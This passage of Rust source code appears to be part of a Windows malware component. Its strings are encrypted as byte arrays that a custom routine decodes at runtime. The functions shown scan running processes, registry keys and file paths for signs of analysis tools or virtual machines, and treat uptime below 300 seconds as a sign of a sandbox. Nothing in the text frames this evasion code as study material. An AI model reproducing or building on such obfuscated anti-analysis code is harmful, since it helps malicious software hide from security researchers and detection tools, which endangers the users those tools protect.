, 228 , 133 , 244 , 179 , 190 , 161 , 63 , 240 , 134 , 121 , 89 , 89 , 115 , 207 , 101 , 106 , 81 , 75 , 2 , 233 , 118 , 191 , 163 , 48 , 101 , 186 , 183 , 20 , 175 , 71 , 134 , 54 , 92 , 135 , 12 , 233 , 104 , 17 , 204 , 45 , 158 , 206 , 254 , 19 , 148 , 74 , 251 , 13 , 163 , 57 , 141 , 124 , 35 , 139 , 188 , 176 , 177 , 90 , 253 , 11 , 191 , 215 , 38 , 20 , 234 , 113 , 0 , 83 , 226 , 237 , 120 , 45 , 155 , 137 , 220 , 89 , 154 , 85 , 3 , 215 , 102 , 94 , 138 , 167 , 224 , 240 , 24 , 15 , 236 , 167 , 177 , 233 , 21 , 162 , 236 , 158 , 138 , 59 , 173 , 111 , 105 , 244 , 14 , 250 , 110 , 101 , 36 , 149 , 157 , 1 , 252 , 143 , 131 , 121 , 239 , 65 , 215] , & [158 , 104 , 242 , 79 , 148 , 234 , 73 , 178 , 209 , 29 , 138 , 245 , 106 , 196 , 128 , 203 , 182 , 36 , 224 , 37 , 255 , 245 , 148 , 10 , 63 , 40 , 219 , 218 , 76 , 176 , 3 , 36 , 142 , 167 , 55 , 165 , 96 , 88 , 102 , 111 , 77 , 136 , 255 , 80 , 166 , 239 , 115 , 144 , 237 , 217 , 149 , 148 , 176 , 230 , 238 , 155 , 206 , 112 , 201 , 66 , 182 , 22 , 45 , 211 , 229 , 45 , 22 , 158 , 45 , 159 , 6 , 181 , 253 , 63 , 129 , 181 , 202 , 121 , 102 , 169 , 22 , 186 , 73 , 183 , 221 , 77 , 156 , 252] , 20186346292091u64) , decode_einewwforzln (& [72 , 248 , 189 , 203 , 22 , 148 , 74 , 19 , 119 , 108 , 63 , 109 , 184 , 62 , 87 , 90 , 33 , 18 , 124 , 77 , 89 , 160 , 213 , 118 , 145 , 123 , 170 , 252 , 183 , 169 , 157 , 40 , 28 , 190 , 26 , 71 , 120 , 125 , 131 , 37 , 38 , 18 , 187 , 199 , 127 , 161 , 208 , 195 , 13 , 88 , 168 , 22 , 228 , 100 , 131 , 37 , 211 , 45 , 195 , 198 , 153 , 166 , 226 , 225 , 54 , 68 , 184 , 139 , 170 , 136 , 213 , 132 , 32 , 210 , 13 , 158 , 38 , 110 , 127 , 35 , 102 , 57 , 7 , 86 , 136 , 216 , 137 , 94 , 191 , 210 , 0 , 201 , 197 , 192 , 135 , 33 , 190 , 3 , 132 , 13 , 216 , 239 , 223 , 216 , 246 , 49 , 172 , 230 , 69 , 122 , 68 , 115 , 53 , 132 , 217 , 214 , 11 , 13 , 239 , 116 , 252 , 118 , 74 , 29 , 167 , 138 , 109 , 11 , 122 , 106 , 231 , 134 , 7 , 44 , 181 , 96 , 222 , 227 , 97 , 156 , 107 , 12 , 224 , 185] , & [83 , 103 , 59 , 59 , 81 , 52 , 31 , 208 , 45 , 197 , 220 , 20 , 32 , 121 , 135 , 31 , 229 , 3 , 243 , 126 , 196 , 139 , 199 , 81 , 122 , 97 , 217 , 111 , 167 , 58 , 6 , 37 , 203 , 152 , 102 , 125 , 146 , 69 , 122 , 69 , 198 , 237 , 224 , 131 , 252 , 209 , 41 , 49 , 76 , 124 , 50 , 67 , 125 , 51 , 97 , 46 , 103 , 88 , 3 , 22 , 158 , 240 , 24 , 179 , 70 , 249 , 235 , 152 , 59 , 130 , 18 , 175 , 8 , 103 , 74 , 141 , 156 , 248 , 142 , 182 , 165 , 135 , 15 , 19 , 64 , 91 , 189 , 177] , 20371029885824u64) ,] ; if let Ok (snapshot) = unsafe { CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS , 0) } { if snapshot . is_invalid () { return false ; } let mut process_entry = PROCESSENTRY32 { dwSize : std :: mem :: size_of :: < PROCESSENTRY32 > () as u32 , .. Default :: default () } ; if unsafe { Process32First (snapshot , & mut process_entry) } . is_ok () { loop { let process_name = unsafe { std :: ffi :: CStr :: from_ptr (process_entry . szExeFile . as_ptr () as * const i8) } . to_string_lossy () . to_lowercase () ; for suspicious in suspicious_processes { if process_name . contains (suspicious) { unsafe { let _ = CloseHandle (snapshot) ; } ; return true ; } } if unsafe { Process32Next (snapshot , & mut process_entry) } . is_err () { break ; } } } unsafe { let _ = CloseHandle (snapshot) ; } ; } false } pub fn check_artifacts () -> bool { let suspicious_registry_keys = [decode_einewwforzln (& [246 , 128 , 188 , 105 , 47 , 16 , 228 , 145 , 97 , 137 , 13 , 84 , 72 , 156 , 226 , 119 , 213 , 236 , 67 , 18 , 184 , 55 , 232 , 34 , 250 , 223 , 129 , 178 , 51 , 126 , 191 , 220 , 197 , 216 , 213 , 213 , 140 , 17 , 209 , 104 , 12 , 66 , 51 , 40 , 95 , 202 , 5 , 11 , 44 , 140 , 81 , 255 , 229 , 105 , 10 , 215 , 138 , 35 , 82 , 44 , 151 , 175 , 210 , 133 , 188 , 3 , 159 , 67 , 67 , 85 , 235 , 47 , 41 , 54 , 185 , 204 , 211 , 190 , 54 , 78 , 222 , 176 , 169 , 95 , 36 , 122 , 126 , 153 , 18 , 155 , 141 , 0 , 130 , 229 , 103 , 25 , 153 , 216 , 240 , 183 , 96 , 16 , 2 , 100 , 50 , 183 , 35 , 132 , 110 , 110 , 183 , 2 , 215 , 42 , 92 , 92 , 25 , 128 , 81 , 104 , 108 , 152 , 96 , 183 , 129 , 217 , 107 , 73 , 51 , 23 , 247 , 90 , 43 , 63 , 77 , 80 , 56 , 69 , 176 , 101 , 8 , 240 , 52 , 127 , 219 , 231 , 203 , 224 , 174 , 159 , 205 , 170 , 93 , 81 , 66 , 241 , 177 , 73 , 235 , 74 , 246 , 127 , 83 , 220 , 138 , 105 , 175 , 230 , 1 , 86 , 18 , 48 , 157 , 68 , 209 , 176 , 66 , 67 , 70 , 24 , 139 , 138 , 152 , 231 , 29 , 229 , 253 , 26 , 28 , 16 , 141 , 110 , 196 , 163 , 83 , 177 , 52 , 24 , 33 , 245 , 108 , 35 , 168 , 172 , 241 , 225 , 212 , 202 , 96 , 144 , 183 , 136 , 61 , 242 , 40 , 37 , 201 , 16 , 191 , 225 , 116 , 253 , 89 , 113 , 47 , 72 , 174 , 218 , 40 , 230 , 42 , 225 , 210 , 127 , 182 , 34 , 218 , 245 , 71 , 62 , 112 , 184 , 175 , 208 , 234 , 126 , 41 , 130 , 161 , 61 , 31 , 3 , 214 , 100 , 129 , 61 , 147 , 34 , 67 , 249 , 34 , 167 , 216 , 166 , 19 , 63 , 61 , 237 , 15 , 138 , 253 , 143 , 99 , 10 , 81 , 205 , 243 , 247 , 144 , 193 , 21 , 241 , 53 , 161 , 45 , 154 , 144 , 149 , 218 , 137 , 191 , 242 , 46 , 194 , 106 , 194 , 187 , 249 , 243 , 32 , 181 , 34 , 10 , 47 , 175 , 37 , 148 , 174 , 127 , 127 , 119 , 156 , 89 , 149 , 119 , 169 , 10 , 49 , 6 , 214] , & [26 , 210 , 210 , 232 , 14 , 254 , 237 , 85 , 64 , 58 , 106 , 20 , 201 , 114 , 134 , 101 , 173 , 228 , 108 , 210 , 49 , 38 , 122 , 99 , 131 , 52 , 174 , 129 , 97 , 206 , 159 , 144 , 39 , 97 , 210 , 173 , 239 , 175 , 221 , 19 , 145 , 249 , 82 , 55 , 7 , 173 , 190 , 11 , 7 , 71 , 92 , 153 , 231 , 113 , 211 , 36 , 85 , 176 , 205 , 123 , 176 , 31 , 193 , 169 , 193 , 168 , 49 , 30 , 76 , 118 , 37 , 15 , 208 , 179 , 235 , 203 , 251 , 128 , 13 , 193 , 89 , 96 , 244 , 100 , 128 , 36 , 44 , 252] , 106055627442092u64) , decode_einewwforzln (& [244 , 221 , 227 , 184 , 185 , 60 , 246 , 65 , 165 , 159 , 120 , 49 , 23 , 74 , 21 , 241 , 21 , 25 , 141 , 1 , 7 , 110 , 125 , 125 , 93 , 93 , 117 , 162 , 130 , 182 , 225 , 139 , 132 , 161 , 207 , 128 , 50 , 64 , 182 , 224 , 32 , 59 , 19 , 218 , 231 , 188 , 172 , 16 , 93 , 33 , 98 , 12 , 88 , 118 , 64 , 80 , 175 , 110 , 227 , 235 , 143 , 133 , 61 , 219 , 178 , 199 , 142 , 179 , 226 , 39 , 18 , 16 , 155 , 73 , 144 , 128 , 120 , 237 , 224 , 71 , 216 , 100 , 146 , 219 , 250 , 223 , 225 , 172 , 244 , 42 , 5 , 233 , 138 , 254 , 17 , 73 , 157 , 183 , 167 , 107 , 198 , 247 , 218 , 204 , 4 , 129 , 111 , 155 , 237 , 79 , 204 , 43 , 102 , 139 , 131 , 85 , 234 , 218 , 71 , 5 , 13 , 238 , 34 , 172 , 91 , 151 , 112 , 140 , 143 , 163 , 142 , 47 , 199 , 109 , 64 , 234 , 128 , 220 , 164 , 154 , 35 , 109 , 236 , 117 , 81 , 222 , 188 , 68 , 240 , 71 , 253 , 153 , 245 , 132 , 83 , 193 , 68 , 198 , 218 , 148 , 138 , 122 , 142 , 113 , 149 , 172 , 96 , 67 , 250 , 113 , 219 , 206 , 197 , 234 , 51 , 251 , 38 , 237 , 69 , 186 , 200 , 64 , 233 , 9 , 252 , 79 , 116 , 43 , 232 , 166 , 58 , 186 , 183 , 26 , 77 , 17 , 145 , 53 , 189 , 204 , 195 , 35 , 5 , 24 , 178 , 120 , 114 , 254 , 89 , 119 , 253 , 100 , 141 , 224 , 137 , 9 , 31 , 97 , 19 , 103 , 239 , 222 , 177 , 250 , 28 , 17 , 7 , 3 , 242 , 19 , 118 , 157 , 115 , 224 , 227 , 247 , 48 , 155 , 37 , 122 , 99 , 55 , 113 , 38 , 136 , 3 , 181 , 181 , 35 , 0 , 214 , 62 , 230 , 83 , 79 , 174 , 118 , 250 , 72 , 229 , 88 , 109 , 156 , 108 , 130 , 122 , 195 , 18 , 227 , 152 , 120 , 20 , 167 , 20 , 97 , 160 , 115 , 107 , 97 , 154 , 39 , 92 , 225 , 246 , 195 , 175 , 66 , 113 , 92 , 94 , 134 , 119 , 50 , 16 , 157 , 101 , 25 , 22 , 137 , 206 , 78 , 86 , 78 , 207 , 204 , 93 , 192 , 105 , 169 , 246 , 208 , 207 , 52 , 11 , 243 , 153 , 135 , 33 , 219 , 25 , 196 , 3 , 21 , 252 , 16 , 245 , 106 , 79 , 108 , 54 , 233 , 62 , 171 , 119 , 168 , 31 , 42 , 83 , 52 , 21 , 220 , 203 , 210 , 45 , 23 , 140 , 214 , 145 , 229 , 76 , 37 , 145 , 86 , 11 , 110 , 241 , 10 , 89 , 29 , 174 , 26 , 178 , 237 , 149 , 209 , 169 , 50 , 167 , 111 , 2 , 242 , 135 , 17 , 54 , 62 , 179 , 122 , 54 , 15 , 154 , 94 , 160 , 5 , 171 , 99 , 129 , 243 , 227 , 241 , 152 , 104 , 64 , 101 , 173 , 111 , 87 , 72 , 49 , 200 , 241 , 180 , 188 , 227 , 153 , 181 , 110 , 5 , 107 , 24 , 139 , 112 , 239 , 71 , 225 , 95 , 100 , 93 , 38 , 71 , 249 , 132 , 94 , 98 , 207 , 166 , 39 , 212 , 19 , 148 , 185 , 0 , 76 , 127 , 195 , 206 , 136 , 23 , 198 , 106 , 199 , 229 , 81 , 121 , 165 , 201 , 175 , 11 , 67 , 214 , 161 , 54 , 168 , 128 , 252 , 23 , 55 , 108 , 150 , 163 , 218 , 229 , 163 , 215 , 174 , 49 , 239 , 222 , 114 , 193 , 73 , 136 , 66 , 43 , 223 , 195 , 199 , 100 , 48 , 215 , 19] , & [145 , 93 , 31 , 122 , 138 , 17 , 161 , 169 , 233 , 125 , 27 , 10 , 94 , 76 , 213 , 214 , 31 , 35 , 104 , 173 , 74 , 170 , 216 , 236 , 184 , 113 , 162 , 114 , 222 , 174 , 94 , 192 , 155 , 245 , 184 , 119 , 166 , 231 , 114 , 131 , 91 , 60 , 125 , 94 , 107 , 231 , 94 , 244 , 4 , 200 , 120 , 179 , 138 , 174 , 4 , 147 , 17 , 210 , 46 , 72 , 28 , 220 , 15 , 152 , 219 , 39 , 191 , 213 , 176 , 197 , 23 , 236 , 147 , 187 , 227 , 242 , 130 , 170 , 22 , 55 , 161 , 92 , 198 , 14 , 168 , 40 , 227 , 109] , 70519068036977u64) ,] ; for key in suspicious_registry_keys { let mut hkey = HKEY_LOCAL_MACHINE ; if unsafe { RegOpenKeyExA (HKEY_LOCAL_MACHINE , PCSTR (key . as_ptr ()) , 0 , KEY_READ , & mut hkey) } . is_ok () { unsafe { let _ = RegCloseKey (hkey) ; } ; return true ; } } let suspicious_files = [decode_einewwforzln (& [200 , 14 , 91 , 113 , 30 , 140 , 144 , 162 , 173 , 232 , 133 , 223 , 46 , 205 , 31 , 225 , 243 , 16 , 190 , 88 , 30 , 185 , 165 , 159 , 166 , 113 , 135 , 71 , 213 , 55 , 150 , 7 , 42 , 42 , 123 , 115 , 137 , 63 , 104 , 97 , 40 , 172 , 150 , 69 , 117 , 57 , 149 , 2 , 110 , 14 , 221 , 222 , 68 , 61 , 179 , 141 , 138 , 88 , 220 , 66 , 74 , 125 , 202 , 12 , 211 , 82 , 220 , 166 , 19 , 120 , 125 , 147 , 131 , 11 , 176 , 169 , 29 , 51 , 206 , 81 , 193 , 122 , 242 , 181 , 155 , 214 , 209 , 217 , 21 , 192 , 124 , 70 , 224 , 226 , 246 , 66 , 229 , 132 , 76 , 156 , 252 , 4 , 76 , 132 , 209 , 14 , 49 , 77 , 97 , 197 , 22 , 47 , 202 , 62 , 69 , 33 , 200 , 29 , 240 , 1 , 181 , 92 , 105 , 216 , 50 , 212 , 8 , 197 , 189 , 114 , 10 , 252 , 64 , 56 , 157 , 249 , 166 , 162 , 247 , 0 , 237 , 51 , 77 , 105 , 223 , 41 , 95 , 159 , 203 , 19 , 26 , 234 , 38 , 247 , 245 , 248 , 113 , 181 , 237 , 210 , 144 , 65 , 82 , 168 , 176 , 10 , 10 , 192 , 163 , 196 , 52 , 61 , 84 , 17 , 41 , 14 , 179 , 91 , 182 , 224 , 131 , 97 , 152 , 240 , 250 , 120 , 186 , 126 , 90 , 202 , 63 , 207 , 7 , 243 , 237 , 173 , 60 , 112 , 21 , 30 , 107 , 13 , 49 , 151 , 169 , 219 , 84 , 63 , 197 , 173 , 3 , 11 , 68 , 119 , 83 , 34 , 244 , 151 , 249 , 195 , 198 , 132 , 97 , 130 , 222 , 72 , 70 , 67 , 181 , 67 , 12 , 203 , 104 , 173 , 131 , 74 , 47 , 228 , 57 , 30 , 181 , 210 , 242 , 210 , 41 , 244 , 146 , 104 , 49 , 19 , 148 , 188 , 202 , 116 , 154 , 94 , 187 , 199 , 42 , 134 , 218 , 99 , 135 , 230 , 206 , 240 , 8 , 126 , 97 , 47 , 54 , 134 , 101 , 222 , 102 , 170 , 162 , 117 , 24 , 141 , 137 , 38 , 229 , 125 , 179 , 248 , 112 , 138 , 207 , 97 , 74 , 179 , 86 , 243 , 247 , 140 , 160 , 131 , 112 , 141 , 75 , 254 , 90 , 186 , 191 , 223 , 36 , 21 , 156 , 0 , 66 , 25 , 138 , 30 , 165 , 194 , 214 , 106 , 39 , 195 , 87 , 125 , 82 , 234 , 250 , 154 , 244 , 63 , 254 , 57 , 166 , 79 , 189 , 70 , 73 , 191 , 206 , 132 , 120 , 239 , 233 , 130 , 21 , 30 , 177 , 164 , 184 , 181 , 238 , 135 , 79 , 8 , 151 , 143 , 221 , 116 , 182 , 62 , 226 , 142 , 150 , 45 , 160 , 0 , 115 , 24 , 186 , 128 , 251 , 226 , 65 , 41 , 255 , 51 , 68 , 143 , 159 , 213 , 215 , 177 , 189 , 173 , 51 , 241 , 55 , 139 , 187 , 120 , 10 , 194 , 79 , 125 , 108 , 157 , 172 , 21 , 233 , 245 , 98 , 143 , 187 , 43 , 159 , 98 , 20 , 202 , 6 , 183 , 111 , 173 , 123 , 203 , 43 , 210 , 222 , 3 , 55 , 199 , 82 , 13 , 180 , 164 , 167 , 193 , 240 , 224 , 115 , 209 , 249 , 118 , 175 , 26 , 140 , 59 , 174 , 127 , 41 , 206 , 184 , 89 , 82 , 9 , 105 , 167 , 121 , 207 , 69 , 232 , 204 , 111 , 22 , 28 , 220 , 134 , 99 , 55 , 131 , 80 , 55 , 212 , 64 , 163 , 88 , 16 , 2 , 49 , 238 , 147 , 2 , 95 , 195 , 242 , 57 , 160 , 111 , 180 , 229 , 149 , 114 , 106] , & [28 , 181 , 169 , 92 , 209 , 6 , 207 , 36 , 48 , 211 , 180 , 113 , 11 , 220 , 236 , 219 , 72 , 42 , 174 , 6 , 20 , 16 , 150 , 78 , 72 , 147 , 105 , 64 , 116 , 98 , 51 , 90 , 16 , 150 , 116 , 106 , 239 , 202 , 174 , 0 , 189 , 70 , 2 , 122 , 54 , 34 , 241 , 52 , 255 , 35 , 20 , 191 , 169 , 64 , 120 , 226 , 126 , 65 , 45 , 249 , 230 , 29 , 154 , 243 , 120 , 62 , 134 , 252 , 181 , 255 , 45 , 190 , 100 , 66 , 20 , 86 , 177 , 235 , 91 , 171 , 212 , 77 , 89 , 68 , 133 , 238 , 12 , 156] , 53085795782455u64) , decode_einewwforzln (& [155 , 3 , 235 , 104 , 120 , 224 , 137 , 128 , 209 , 205 , 109 , 99 , 125 , 53 , 71 , 197 , 23 , 150 , 253 , 237 , 157 , 187 , 218 , 234 , 145 , 70 , 211 , 42 , 83 , 168 , 208 , 39 , 14 , 135 , 54 , 147 , 106 , 68 , 127 , 97 , 223 , 215 , 51 , 78 , 126 , 174 , 224 , 101 , 188 , 233 , 212 , 26 , 194 , 192 , 176 , 97 , 88 , 120 , 17 , 83 , 137 , 91 , 254 , 89 , 105 , 217 , 10 , 186 , 89 , 98 , 255 , 5 , 86 , 13 , 198 , 161 , 12 , 11 , 88 , 119 , 148 , 60 , 119 , 78 , 123 , 194 , 192 , 232 , 72 , 130 , 24 , 43 , 54 , 21 , 156 , 169 , 74 , 205 , 86 , 206 , 31 , 0 , 87 , 113 , 233 , 196 , 13 , 90 , 251 , 40 , 138 , 76 , 12 , 38 , 21 , 76 , 77 , 58 , 3 , 148 , 232 , 181 , 146 , 80 , 33 , 230 , 215 , 162 , 168 , 175 , 223 , 11 , 143 , 103 , 166 , 207 , 37 , 177 , 111 , 139 , 153 , 238 , 114 , 236 , 10 , 252 , 154 , 75 , 208 , 85 , 108 , 77 , 194 , 146 , 53 , 178 , 59 , 71 , 86 , 175 , 226 , 224 , 82 , 92 , 14 , 156 , 61 , 92 , 100 , 31 , 129 , 212 , 53 , 0 , 137 , 245 , 119 , 252 , 139 , 193 , 1 , 80 , 19 , 217 , 28 , 123 , 71 , 250 , 155 , 160 , 2 , 240 , 39 , 15 , 196 , 138 , 121 , 69 , 135 , 174 , 184 , 198 , 226 , 86 , 38 , 72 , 73 , 136 , 122 , 137 , 91 , 198 , 139 , 133 , 90 , 98 , 84 , 86 , 219 , 58 , 158 , 234 , 143 , 221 , 45 , 62 , 156 , 255 , 163 , 180 , 167 , 204 , 61 , 129 , 170 , 89 , 131 , 8 , 10 , 14 , 59 , 50 , 7 , 206 , 130 , 197 , 221 , 200 , 135 , 119 , 253 , 3 , 126 , 62 , 111 , 63 , 223 , 62 , 20 , 48 , 17 , 25 , 19 , 14 , 129 , 255 , 27 , 75 , 45 , 229 , 79 , 81 , 236 , 92 , 39 , 123 , 210 , 1 , 219 , 23 , 24 , 86 , 41 , 42 , 217 , 246 , 108 , 103 , 205 , 209 , 57 , 69 , 34 , 61 , 196 , 180 , 92 , 37 , 235 , 28 , 217 , 91 , 8 , 44 , 227 , 143 , 196 , 202 , 157 , 121 , 91 , 116 , 117 , 233 , 144 , 182 , 107 , 23 , 7 , 185 , 74 , 79 , 196 , 3 , 56 , 9 , 144 , 55 , 37 , 64 , 41 , 234 , 74 , 197 , 144 , 237 , 62 , 40 , 237 , 171 , 148 , 76 , 216 , 118 , 6 , 175 , 216 , 132 , 188 , 22 , 165 , 253 , 186 , 64 , 160 , 193 , 16 , 37 , 233 , 121 , 143 , 182 , 92 , 54 , 183 , 38 , 129 , 207 , 230 , 39 , 124 , 6 , 197 , 55 , 253 , 2 , 41 , 130 , 89 , 215 , 56 , 141 , 177 , 233 , 114 , 157 , 161 , 132 , 24 , 58 , 211 , 224 , 106 , 29 , 17 , 79 , 63 , 76 , 197 , 188 , 29 , 8 , 58 , 157 , 245 , 69 , 219 , 55 , 63 , 60 , 77 , 236 , 76 , 16 , 35 , 225 , 171 , 102 , 167 , 253 , 248 , 7 , 4 , 168 , 111 , 185 , 185 , 81 , 214 , 216 , 92 , 221 , 61 , 221 , 127 , 151 , 224 , 213 , 205 , 154 , 206 , 102 , 3 , 179 , 178 , 212 , 35 , 238 , 20 , 211 , 131 , 162 , 207 , 35 , 80 , 32 , 66 , 18 , 8 , 38 , 136 , 130 , 56 , 131 , 9 , 61 , 187 , 49 , 98 , 82 , 13 , 251 , 145 , 16 , 146 , 242 , 145 , 132 , 33 , 14] , & [188 , 85 , 3 , 242 , 42 , 160 , 160 , 149 , 61 , 105 , 194 , 66 , 245 , 177 , 166 , 254 , 84 , 87 , 39 , 186 , 177 , 31 , 160 , 150 , 114 , 65 , 216 , 136 , 146 , 77 , 102 , 174 , 206 , 42 , 92 , 114 , 202 , 5 , 116 , 27 , 144 , 214 , 197 , 228 , 97 , 34 , 143 , 225 , 180 , 158 , 90 , 71 , 103 , 206 , 144 , 80 , 248 , 211 , 66 , 229 , 36 , 67 , 150 , 8 , 75 , 40 , 18 , 46 , 34 , 92 , 146 , 95 , 125 , 194 , 187 , 148 , 193 , 152 , 76 , 11 , 223 , 92 , 120 , 80 , 90 , 24 , 140 , 6] , 52901112188726u64) ,] ; for file in suspicious_files { if Path :: new (file) . exists () { return true ; } } false } pub fn check_uptime () -> bool { let uptime_ms = unsafe { GetTickCount64 () } ; if uptime_ms < (75884 + 224116) { return true ; } false }